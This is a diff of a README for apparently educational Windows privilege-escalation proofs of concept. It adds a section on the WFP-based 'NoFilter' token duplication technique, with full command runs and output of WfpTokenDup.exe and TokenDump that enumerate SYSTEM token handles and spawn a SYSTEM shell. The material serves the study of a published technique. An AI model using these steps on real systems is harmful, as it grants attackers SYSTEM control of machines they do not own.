@@ -2,6 +2,13 @@
 
 This directory is for PoCs to help learning how to get SYSTEM privilege.
 
+## Table Of Contents
+
+- [Arts Of GetSystem](#arts-of-getsystem)
+  - [Named Pipe Impersonation](#named-pipe-impersonation)
+  - [Token Stealing](#token-stealing)
+  - [Token Duplication with WFP](#token-duplication-with-wfp)
+
 ## Named Pipe Impersonation
 
 Named Pipe impersonation technique is one of the most popular technique to get SYSTEM privilege.
@@ -68,3 +75,137 @@ PS C:\Dev>
 ![](./figures/AssignPrimaryToken.png)
 
 ![](./figures/SecondaryLogon.png)
+
+
+## Token Duplication with WFP
+
+This method is presented at DEF CON 31 (2023) by Ron Ben-Yizhak.
+
+* [#NoFilter - Abusing Windows Filtering Platform for Privilege Escalation](https://www.deepinstinct.com/blog/nofilter-abusing-windows-filtering-platform-for-privilege-escalation)
+* [Slide](https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Ron%20Ben-Yizhak%20-%20NoFilter%20Abusing%20Windows%20Filtering%20Platform%20for%20privilege%20escalation.pdf)
+
+In summary, this approach uses the Windows Filtering Platform (WFP) functionality to achieve Token Duplication.
+
+```
+PS C:\Dev> .\WfpTokenDup.exe -h
+
+WfpTokenDup - PoC for token stealing with Windows Filtering Platform.
+
+Usage: WfpTokenDup.exe [Options]
+
+        -h, --help   : Displays this help message.
+        -S, --system : Flag to get SYSTEM shell.
+        -p, --pid    : Specifies PID to duplicate token handle in decimal format.
+        -v, --value  : Specifies handle value to duplicate token handle in hex format.
+```
+
+To get SYSTEM privilege, simply set `-S` flag:
+
+```
+PS C:\Dev> .\WfpTokenDup.exe -S
+
+[>] Trying to get a WfpAle handle.
+[+] Got a WfpAle handle (handle = 0x2FC).
+[>] Trying to get WFP engine handle.
+[+] Got a WFP engine handle (hanlde = 0x1AB7DCF8AF0).
+[>] Installing new IPSec policy.
+[+] New IPSec policy is installed (GUID: 57f77e37-2cc3-49db-b462-728702621fed)
+[>] Triggering printer.
+[*] RPC_STATUS is 0x00000709.
+[>] Trying to find SYSTEM token.
+[+] Got a SYSTEM token (handle = 0x328).
+    [*] Modified ID : 0x000000000000001C
+[>] Uninstalling IPSec policy.
+[+] IPSec policy is uninstalled successfully.
+[>] Trying to spawn token assigned shell with Secondary Logon service.
+[+] Got a token assigned shell.
+[*] Done.
+```
+
+This PoC uses Secondaly Logon service, so SYSTEM shell will be spawned with other console as following figure.
+Duplicated token has SeTcbPrivilege, so we can get shell in same console with S4U logon technique, but I don't implement it currently.
+
+![](./figures/WfpTokenDup-1.png)
+
+If you want to try duplicate token handle in another process with WFP, set PID in decimal format with `-p` option and handle value in hex format with `-v` option.
+To get handle information, you can use my another tool named as [TokenDump](../TokenDump) as follows:
+
+```
+PS C:\Dev> .\TokenDump.exe -e -H
+
+[>] Trying to enumerate token handles.
+
+[Token Handle(s) - winlogon.exe (PID: 704)]
+
+Handle Session Token User          Integrity Restricted AppContainer Token Type    Impersonation Level
+====== ======= =================== ========= ========== ============ ============= ===================
+ 0x2B0       1 NT AUTHORITY\SYSTEM System    False      False        Primary       Anonymous
+ 0x2B4       1 NT AUTHORITY\SYSTEM System    False      False        Primary       Anonymous
+
+
+--snip--
+
+[Token Handle(s) - svchost.exe (PID: 2568)]
+
+Handle Session Token User          Integrity Restricted AppContainer Token Type Impersonation Level
+====== ======= =================== ========= ========== ============ ========== ===================
+ 0x240       1 dev22h2\user        High      False      False        Primary    Identification
+ 0x248       1 dev22h2\user        High      False      False        Primary    Identification
+ 0x298       1 dev22h2\user        High      False      False        Primary    Identification
+ 0x2B8       0 NT AUTHORITY\SYSTEM System    False      False        Primary    Anonymous
+
+[+] Got 892 handle(s).
+[*] Found 8 account(s).
+    [*] NT AUTHORITY\SYSTEM
+    [*] dev22h2\user
+    [*] Font Driver Host\UMFD-1
+    [*] Font Driver Host\UMFD-0
+    [*] NT AUTHORITY\NETWORK SERVICE
+    [*] Window Manager\DWM-1
+    [*] NT AUTHORITY\LOCAL SERVICE
+    [*] NT AUTHORITY\ANONYMOUS LOGON
+[*] Done.
+
+PS C:\Dev> .\TokenDump.exe -e -H -p 2568 -a system
+
+[>] Trying to enumerate token handles.
+
+[Token Handle(s) - svchost.exe (PID: 2568)]
+
+Handle Session Token User          Integrity Restricted AppContainer Token Type Impersonation Level
+====== ======= =================== ========= ========== ============ ========== ===================
+ 0x2B8       0 NT AUTHORITY\SYSTEM System    False      False        Primary    Anonymous
+
+[+] Got 1 handle(s).
+[*] Found 2 account(s).
+    [*] dev22h2\user
+    [*] NT AUTHORITY\SYSTEM
+[*] Done.
+
+PS C:\Dev>
+```
+
+Using this information, perform token duplication and spawn token assigned shell with Secondary Logon service as follows:
+
+```
+PS C:\Dev> .\WfpTokenDup.exe -p 2568 -v 0x2B8
+
+[*] Target information:
+    [*] Process Name : svchost
+    [*] Process ID   : 2568
+    [*] Handle Value : 0x2B8
+[>] Trying to get a WfpAle handle.
+[+] Got a WfpAle handle (handle = 0x110).
+[>] Trying to register the target object handle to WFP.
+[+] Token registration maybe successful.
+    [*] Modified ID : 0x00000000000003A5
+[>] Trying to fetch the registered token.
+[+] Got the registered token (handle = 0x2EC).
+[>] Releasing the registered token from WFP.
+[+] The registered token is released successfully.
+[>] Trying to spawn token assigned shell with Secondary Logon service.
+[+] Got a token assigned shell.
+[*] Done.
+```
+
+![](./figures/WfpTokenDup-2.png)
